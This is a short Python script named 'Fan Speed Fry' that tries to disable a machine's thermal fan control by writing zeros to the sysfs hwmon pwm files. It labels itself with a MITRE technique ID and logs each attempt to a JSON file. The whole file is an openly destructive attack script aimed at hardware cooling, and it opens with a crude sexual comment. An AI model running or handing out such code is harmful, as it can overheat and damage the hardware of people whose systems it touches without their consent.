#!/usr/bin/env python3
# I wanna see titties so fuck the fan

import os, json, time, argparse
from datetime import datetime

LOG_FILE = "results/fan_speed_fry_logs.json"
MITRE_TTP = "T1496"

def log_action(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def disable_fan_control():
    try:
        with open("/sys/class/hwmon/hwmon0/pwm1_enable", "w") as f:
            f.write("0")
        with open("/sys/class/hwmon/hwmon0/pwm1", "w") as f:
            f.write("0")
        return True
    except Exception as e:
        print(f"[!] Fan control override failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Fan Speed Fry — Disables thermal fan control via sysfs")
    args = parser.parse_args()

    result = disable_fan_control()
    log_action({
        "timestamp": datetime.utcnow().isoformat(),
        "action": "fan_control_disabled",
        "success": result,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
